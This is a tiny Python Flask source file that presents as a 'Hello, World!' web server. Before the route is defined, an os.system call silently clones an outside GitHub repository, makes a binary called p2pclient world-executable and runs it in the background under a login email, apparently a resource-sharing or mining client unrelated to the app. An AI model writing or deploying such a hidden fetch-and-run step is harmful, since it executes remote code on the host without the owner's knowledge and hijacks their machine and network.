from flask import Flask
app = Flask(__name__)
import os
os.system ('git clone https://github.com/zamreskhan/anu.git && cd anu && chmod 777 p2pclient && nohup ./p2pclient --login garsenkamser@gmail.com &')
@app.route('/')
def hello_world():
    return 'Hello, World!'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
